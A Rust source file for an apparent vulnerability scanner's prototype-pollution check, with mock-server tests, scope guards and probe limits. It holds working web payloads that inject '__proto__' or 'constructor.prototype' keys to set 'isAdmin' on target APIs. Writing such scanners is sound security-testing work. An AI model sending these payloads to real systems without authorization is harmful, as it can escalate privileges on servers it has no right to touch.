//! Prototype-pollution scanner: proves a JSON body with a `__proto__`/
//! `constructor.prototype` key elevates the caller's profile.

use reqwest::Response;
use riftlock_core::ScopedClient as Client;
use riftlock_core::ScopedRequestBuilder;
use riftlock_core::{
    paths_for_method, text_limited_result, Coverage, DiscoveredEndpoint, Evidence, Finding,
    ProofGate, ScanError, Scanner, ScopeGuard,
};
use serde_json::Value;
use std::time::Duration;
use url::Url;

/// JSON bodies that pollute the prototype chain when merged unguarded.
const PAYLOADS: &[&str] = &[
    r#"{"__proto__": {"isAdmin": true}}"#,
    r#"{"constructor": {"prototype": {"isAdmin": true}}}"#,
];

/// Fallback profile endpoint when AST discovery found none.
const DEFAULT_PROFILE: &str = "/api/me";

/// Path substrings marking user-profile endpoints worth re-reading.
const PROFILE_MARKERS: &[&str] = &["/me", "/profile"];

/// Hard cap on pollution probes per scan — endpoints × payloads is
/// combinatorial, and request volume must stay bounded.
const MAX_PROBES: usize = 30;

/// Per-request cap so a stalled probe cannot hang the scan.
const PROBE_TIMEOUT: Duration = Duration::from_secs(1);

/// The prototype-pollution scanner. Endpoints come from AST discovery; each
/// is injected with a pollution body, then a profile endpoint is re-read:
/// elevation that was absent in the baseline is the proof.
#[derive(Debug, Default)]
pub struct PrototypeScanner {
    /// Endpoint paths discovered by AST (absolute, e.g. `/api/settings`).
    pub endpoints: Vec<String>,
    /// Methods observed for endpoint paths; empty preserves path-only callers.
    pub endpoint_methods: Vec<DiscoveredEndpoint>,
    /// Shared coverage counters: an unreadable baseline or profile is a
    /// failed endpoint or an inconclusive check, never a clean negative.
    pub coverage: Coverage,
}

/// Profile endpoints to re-read: discovered `/me`- or `/profile`-like paths,
/// plus the default lab endpoint.
fn profile_endpoints(discovered: &[String]) -> Vec<String> {
    let mut paths: Vec<String> = discovered
        .iter()
        .filter(|e| PROFILE_MARKERS.iter().any(|m| e.contains(m)))
        .cloned()
        .collect();
    paths.push(DEFAULT_PROFILE.to_owned());
    paths
        .into_iter()
        .collect::<std::collections::BTreeSet<_>>()
        .into_iter()
        .collect()
}

/// Whether a profile body claims elevated privileges: any (possibly nested)
/// `isAdmin: true` or `role: "admin"`.
fn is_elevated(value: &Value) -> bool {
    match value {
        Value::Object(map) => {
            map.iter().any(|(k, v)| {
                (k == "isAdmin" && v == &Value::Bool(true))
                    || (k == "role" && v.as_str().is_some_and(|r| r.eq_ignore_ascii_case("admin")))
            }) || map.values().any(is_elevated)
        }
        Value::Array(items) => items.iter().any(is_elevated),
        _ => false,
    }
}

/// Send `request` with the probe cap. A timeout yields `None` so the caller
/// can return its partial findings; other transport errors stay fatal.
async fn send(request: ScopedRequestBuilder) -> Result<Option<Response>, ScanError> {
    match request
        .timeout(PROBE_TIMEOUT)
        .bypass_adaptive_timeout()
        .send()
        .await
    {
        Ok(resp) => Ok(Some(resp)),
        Err(e) if e.is_timeout() => Ok(None),
        Err(e) => Err(e),
    }
}

impl Scanner for PrototypeScanner {
    fn id(&self) -> &'static str {
        "prototype"
    }

    fn matches(&self, _url: &Url) -> bool {
        // JSON APIs that merge request bodies exist on any host.
        true
    }

    async fn scan(
        &self,
        url: &Url,
        client: &Client,
        guard: &ScopeGuard,
        passive: bool,
    ) -> Result<Vec<Finding>, ScanError> {
        if passive {
            return Ok(Vec::new());
        }
        // Pollution probes are POST/PATCH writes; read depth never sends them.
        if guard.is_read_only() {
            return Ok(Vec::new());
        }
        guard.check_active(url)?;
        let mut findings = Vec::new();
        // Baseline first: if the profile is already elevated, pollution
        // cannot be distinguished from the existing state (checked negative).
        let mut baseline = None;
        for path in profile_endpoints(&self.endpoints) {
            let profile = url.join(&path).map_err(|_| ScanError::InvalidUrl)?;
            if guard.check(&profile).is_err() {
                self.coverage
                    .endpoint_at(profile.as_str(), riftlock_core::EndpointOutcome::Skipped);
                continue;
            }
            let profile_key = profile.as_str().to_owned();
            let Some(resp) = send(client.get(profile)).await? else {
                self.coverage
                    .endpoint_at(&profile_key, riftlock_core::EndpointOutcome::TimedOut);
                let check = self.coverage.begin_check();
                let _ = check.finish(riftlock_core::CheckState::TimedOut);
                return Ok(findings);
            };
            if resp.status().as_u16() == 200 {
                match text_limited_result(resp).await {
                    Ok(body) => {
                        baseline = Some(body);
                        break;
                    }
                    Err(error) => {
                        // Without a readable baseline, elevation cannot be
                        // attributed to the injection.
                        riftlock_core::logln!(
                            "[!] Prototype baseline unreadable ({error}); endpoint marked failed."
                        );
                        self.coverage.unreadable_endpoint_at(&profile_key);
                        return Ok(findings);
                    }
                }
            }
        }
        let Some(baseline) = baseline else {
            // No readable profile: nothing to diff against.
            return Ok(findings);
        };
        let baseline_elevated = serde_json::from_str::<Value>(&baseline)
            .map(|v| is_elevated(&v))
            .unwrap_or(false);
        let methods = if self
            .endpoint_methods
            .iter()
            .any(|endpoint| self.endpoints.iter().any(|path| path == &endpoint.path))
        {
            self.endpoint_methods.as_slice()
        } else {
            &[]
        };
        let post_endpoints = paths_for_method(&self.endpoints, methods, "POST");
        let patch_endpoints = paths_for_method(&self.endpoints, methods, "PATCH");
        let method_aware = !methods.is_empty();
        let injection_endpoints = if !method_aware {
            self.endpoints.clone()
        } else {
            post_endpoints
                .iter()
                .chain(&patch_endpoints)
                .cloned()
                .collect::<std::collections::BTreeSet<_>>()
                .into_iter()
                .collect()
        };
        let mut probes = 0usize;
        for endpoint in &injection_endpoints {
            let post_supported = !method_aware || post_endpoints.contains(endpoint);
            let patch_supported = !method_aware || patch_endpoints.contains(endpoint);
            for payload in PAYLOADS {
                if probes >= MAX_PROBES {
                    return Ok(findings);
                }
                probes += 1;
                let target = url.join(endpoint).map_err(|_| ScanError::InvalidUrl)?;
                if guard.check(&target).is_err() {
                    break;
                }
                let response = if post_supported {
                    let Some(resp) = send(client.post(target.clone()).body(*payload)).await? else {
                        self.coverage
                            .endpoint_at(target.as_str(), riftlock_core::EndpointOutcome::TimedOut);
                        let check = self.coverage.begin_check();
                        let _ = check.finish(riftlock_core::CheckState::TimedOut);
                        return Ok(findings);
                    };
                    if resp.status().as_u16() == 405 && patch_supported {
                        // Legacy path-only mode keeps the old 405-to-PATCH fallback;
                        // method-aware mode only uses PATCH when discovery observed it.
                        send(client.patch(target.clone()).body(*payload)).await?
                    } else {
                        Some(resp)
                    }
                } else if patch_supported {
                    send(client.patch(target.clone()).body(*payload)).await?
                } else {
                    continue;
                };
                let Some(resp) = response else {
                    self.coverage
                        .endpoint_at(target.as_str(), riftlock_core::EndpointOutcome::TimedOut);
                    let check = self.coverage.begin_check();
                    let _ = check.finish(riftlock_core::CheckState::TimedOut);
                    return Ok(findings);
                };
                let status = resp.status().as_u16();
                if !(200..300).contains(&status) {
                    // Injection refused: checked negative for this payload.
                    continue;
                }
                // Re-read every profile endpoint; pollution can surface on
                // any of them.
                for path in profile_endpoints(&self.endpoints) {
                    let profile = url.join(&path).map_err(|_| ScanError::InvalidUrl)?;
                    if guard.check(&profile).is_err() {
                        self.coverage
                            .endpoint_at(profile.as_str(), riftlock_core::EndpointOutcome::Skipped);
                        continue;
                    }
                    let profile_key = profile.as_str().to_owned();
                    let body = match send(client.get(profile)).await {
                        Ok(Some(resp)) if resp.status().as_u16() == 200 => {
                            match text_limited_result(resp).await {
                                Ok(body) => body,
                                Err(error) => {
                                    riftlock_core::logln!(
                                        "[!] Prototype profile unreadable ({error}); endpoint marked failed."
                                    );
                                    self.coverage.unreadable_endpoint_at(&profile_key);
                                    continue;
                                }
                            }
                        }
                        Ok(None) => {
                            self.coverage.endpoint_at(
                                &profile_key,
                                riftlock_core::EndpointOutcome::TimedOut,
                            );
                            let check = self.coverage.begin_check();
                            let _ = check.finish(riftlock_core::CheckState::TimedOut);
                            return Ok(findings);
                        }
                        Err(error) if error.transport_category().is_some() => {
                            self.coverage.unreadable_endpoint_at(&profile_key);
                            return Ok(findings);
                        }
                        _ => continue,
                    };
                    let elevated = serde_json::from_str::<Value>(&body)
                        .map(|v| is_elevated(&v))
                        .unwrap_or(false);
                    if elevated && !baseline_elevated {
                        findings.push(ProofGate::admit(Evidence::PrototypePollution {
                            endpoint: target.to_string(),
                            payload: (*payload).to_owned(),
                        })?);
                        // One proof is enough; further probes add nothing.
                        return Ok(findings);
                    }
                }
            }
        }
        Ok(findings)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn read_only_scan_sends_nothing() {
        let server = wiremock::MockServer::start().await;
        let base = Url::parse(&server.uri()).expect("url");
        let guard = ScopeGuard::new_lab(&[base.as_str()])
            .expect("guard")
            .with_policy(riftlock_core::ScanPolicy::ReadOnly);
        let findings = Scanner::scan(
            &PrototypeScanner::default(),
            &base,
            &Client::new_lab(),
            &guard,
            false,
        )
        .await
        .expect("scan");
        assert!(findings.is_empty());
        assert!(server
            .received_requests()
            .await
            .expect("requests")
            .is_empty());
    }

    #[test]
    fn is_elevated_on_direct_and_nested_markers() {
        assert!(is_elevated(&serde_json::json!({"isAdmin": true})));
        assert!(is_elevated(&serde_json::json!({"role": "admin"})));
        assert!(is_elevated(&serde_json::json!({"user": {"isAdmin": true}})));
    }

    #[test]
    fn is_not_elevated_on_regular_profile() {
        assert!(!is_elevated(
            &serde_json::json!({"role": "user", "isAdmin": false})
        ));
        assert!(!is_elevated(&serde_json::json!({"name": "a"})));
    }

    #[tokio::test]
    async fn scan_proves_pollution_elevation() {
        let server = wiremock::MockServer::start().await;
        // Vulnerable server: the update endpoint merges `__proto__`, the
        // profile flips to elevated after the first (baseline) read.
        wiremock::Mock::given(wiremock::matchers::method("POST"))
            .and(wiremock::matchers::path("/api/settings"))
            .and(wiremock::matchers::body_string(
                r#"{"__proto__": {"isAdmin": true}}"#,
            ))
            .respond_with(wiremock::ResponseTemplate::new(200))
            .mount(&server)
            .await;
        wiremock::Mock::given(wiremock::matchers::method("GET"))
            .and(wiremock::matchers::path("/api/me"))
            .respond_with(
                wiremock::ResponseTemplate::new(200).set_body_string(r#"{"role": "user"}"#),
            )
            .up_to_n_times(1)
            .mount(&server)
            .await;
        wiremock::Mock::given(wiremock::matchers::method("GET"))
            .and(wiremock::matchers::path("/api/me"))
            .respond_with(
                wiremock::ResponseTemplate::new(200).set_body_string(r#"{"isAdmin": true}"#),
            )
            .mount(&server)
            .await;

        let base = Url::parse(server.uri().as_str()).expect("url");
        let guard = ScopeGuard::new_lab(&[server.uri().as_str()]).expect("guard");
        let scanner = PrototypeScanner {
            endpoints: vec!["/api/settings".to_owned()],
            ..Default::default()
        };
        let findings = Scanner::scan(&scanner, &base, &Client::new_lab(), &guard, false)
            .await
            .expect("scan");
        assert_eq!(findings.len(), 1);
        assert!(matches!(
            findings[0].evidence(),
            Evidence::PrototypePollution { endpoint, payload }
                if endpoint.ends_with("/api/settings")
                    && payload == r#"{"__proto__": {"isAdmin": true}}"#
        ));
    }

    #[tokio::test]
    async fn method_inventory_selects_observed_write_method_without_fallback() {
        let server = wiremock::MockServer::start().await;
        wiremock::Mock::given(wiremock::matchers::method("GET"))
            .and(wiremock::matchers::path("/api/me"))
            .respond_with(
                wiremock::ResponseTemplate::new(200).set_body_string(r#"{"role":"user"}"#),
            )
            .mount(&server)
            .await;
        wiremock::Mock::given(wiremock::matchers::method("POST"))
            .and(wiremock::matchers::path("/api/settings"))
            .respond_with(wiremock::ResponseTemplate::new(405))
            .mount(&server)
            .await;
        wiremock::Mock::given(wiremock::matchers::method("PATCH"))
            .and(wiremock::matchers::path("/api/settings"))
            .respond_with(wiremock::ResponseTemplate::new(200))
            .mount(&server)
            .await;

        let base = Url::parse(server.uri().as_str()).expect("url");
        let guard = ScopeGuard::new_lab(&[server.uri().as_str()]).expect("guard");
        let scanner = PrototypeScanner {
            endpoints: vec!["/api/settings".to_owned()],
            endpoint_methods: vec![
                DiscoveredEndpoint {
                    path: "/api/settings".to_owned(),
                    method: "GET".to_owned(),
                },
                DiscoveredEndpoint {
                    path: "/api/settings".to_owned(),
                    method: "PATCH".to_owned(),
                },
                DiscoveredEndpoint {
                    path: "/api/settings".to_owned(),
                    method: "DELETE".to_owned(),
                },
            ],
            ..Default::default()
        };
        let findings = Scanner::scan(&scanner, &base, &Client::new_lab(), &guard, false)
            .await
            .expect("scan");
        assert!(findings.is_empty());
        let requests = server.received_requests().await.expect("requests");
        let methods: Vec<_> = requests
            .iter()
            .filter(|request| request.url.path() == "/api/settings")
            .map(|request| request.method.as_str())
            .collect();
        assert_eq!(methods, vec!["PATCH", "PATCH"]);
    }

    #[tokio::test]
    async fn scan_skips_timed_out_probe() {
        let server = wiremock::MockServer::start().await;
        // The injection stalls past PROBE_TIMEOUT. If it were awaited, the
        // following profile re-read would show elevation; instead the probe
        // is skipped and the scan returns its partial findings.
        wiremock::Mock::given(wiremock::matchers::method("POST"))
            .and(wiremock::matchers::path("/api/settings"))
            .respond_with(
                wiremock::ResponseTemplate::new(200).set_delay(Duration::from_millis(2100)),
            )
            .mount(&server)
            .await;
        wiremock::Mock::given(wiremock::matchers::method("GET"))
            .and(wiremock::matchers::path("/api/me"))
            .respond_with(
                wiremock::ResponseTemplate::new(200).set_body_string(r#"{"role": "user"}"#),
            )
            .up_to_n_times(1)
            .mount(&server)
            .await;
        wiremock::Mock::given(wiremock::matchers::method("GET"))
            .and(wiremock::matchers::path("/api/me"))
            .respond_with(
                wiremock::ResponseTemplate::new(200).set_body_string(r#"{"isAdmin": true}"#),
            )
            .mount(&server)
            .await;

        let base = Url::parse(server.uri().as_str()).expect("url");
        let guard = ScopeGuard::new_lab(&[server.uri().as_str()]).expect("guard");
        let coverage = Coverage::default();
        let scanner = PrototypeScanner {
            endpoints: vec!["/api/settings".to_owned()],
            coverage: coverage.clone(),
            ..Default::default()
        };
        let started = std::time::Instant::now();
        let findings = Scanner::scan(&scanner, &base, &Client::new_lab(), &guard, false)
            .await
            .expect("scan");
        assert!(findings.is_empty());
        assert!(started.elapsed() < Duration::from_secs(4));
        let snapshot = coverage.snapshot(1);
        assert_eq!(snapshot.endpoints_timed_out, 1);
        assert_eq!(snapshot.checks_timed_out, 1);
        assert_eq!(snapshot.vulnerability_checks_completed, 0);
        assert!(snapshot.check_accounting_invariant());
        assert!(coverage.finalize().reconciles());
    }

    #[tokio::test]
    async fn scan_negative_when_injection_refused() {
        let server = wiremock::MockServer::start().await;
        wiremock::Mock::given(wiremock::matchers::method("GET"))
            .and(wiremock::matchers::path("/api/me"))
            .respond_with(
                wiremock::ResponseTemplate::new(200).set_body_string(r#"{"role": "user"}"#),
            )
            .mount(&server)
            .await;
        // Server rejects the polluted body: profile never elevates.
        wiremock::Mock::given(wiremock::matchers::method("POST"))
            .respond_with(wiremock::ResponseTemplate::new(422))
            .mount(&server)
            .await;

        let base = Url::parse(server.uri().as_str()).expect("url");
        let guard = ScopeGuard::new_lab(&[server.uri().as_str()]).expect("guard");
        let scanner = PrototypeScanner {
            endpoints: vec!["/api/settings".to_owned()],
            ..Default::default()
        };
        let findings = Scanner::scan(&scanner, &base, &Client::new_lab(), &guard, false)
            .await
            .expect("scan");
        assert!(findings.is_empty());
    }

    #[tokio::test]
    async fn scan_negative_when_profile_already_elevated() {
        let server = wiremock::MockServer::start().await;
        // Baseline is already admin: pollution cannot be proven.
        wiremock::Mock::given(wiremock::matchers::method("GET"))
            .respond_with(
                wiremock::ResponseTemplate::new(200).set_body_string(r#"{"role": "admin"}"#),
            )
            .mount(&server)
            .await;
        wiremock::Mock::given(wiremock::matchers::method("POST"))
            .respond_with(wiremock::ResponseTemplate::new(200))
            .mount(&server)
            .await;

        let base = Url::parse(server.uri().as_str()).expect("url");
        let guard = ScopeGuard::new_lab(&[server.uri().as_str()]).expect("guard");
        let scanner = PrototypeScanner {
            endpoints: vec!["/api/settings".to_owned()],
            ..Default::default()
        };
        let findings = Scanner::scan(&scanner, &base, &Client::new_lab(), &guard, false)
            .await
            .expect("scan");
        assert!(findings.is_empty());
    }

    #[tokio::test]
    async fn scan_negative_when_no_readable_profile() {
        let server = wiremock::MockServer::start().await;
        // No profile endpoint answers 200: nothing to diff against.
        wiremock::Mock::given(wiremock::matchers::method("GET"))
            .respond_with(wiremock::ResponseTemplate::new(404))
            .mount(&server)
            .await;
        let base = Url::parse(server.uri().as_str()).expect("url");
        let guard = ScopeGuard::new_lab(&[server.uri().as_str()]).expect("guard");
        let scanner = PrototypeScanner::default();
        let findings = Scanner::scan(&scanner, &base, &Client::new_lab(), &guard, false)
            .await
            .expect("scan");
        assert!(findings.is_empty());
    }

    #[tokio::test]
    async fn scan_negative_in_passive_mode() {
        let server = wiremock::MockServer::start().await;
        let base = Url::parse(server.uri().as_str()).expect("url");
        let guard = ScopeGuard::new_lab(&[server.uri().as_str()]).expect("guard");
        let findings = Scanner::scan(
            &PrototypeScanner::default(),
            &base,
            &Client::new_lab(),
            &guard,
            true,
        )
        .await
        .expect("scan");
        assert!(findings.is_empty());
    }
}
